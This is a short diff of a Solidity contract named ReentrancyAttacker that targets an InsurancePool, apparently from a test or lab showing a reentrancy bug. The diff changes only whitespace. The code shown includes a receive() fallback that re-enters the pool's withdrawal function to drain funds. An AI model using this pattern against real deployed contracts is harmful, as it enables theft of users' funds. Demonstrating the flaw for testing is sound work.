@@ -15,10 +15,12 @@ contract ReentrancyAttacker {
 
     constructor(address _pool) {
         pool = InsurancePool(_pool);
-    } 
+    }
+
     function attackWithdr(uint256 amount) external payable {
         pool.withdrawal(amount);
     }
+
     receive() external payable {
         pool.withdrawal(1 ether);
     }
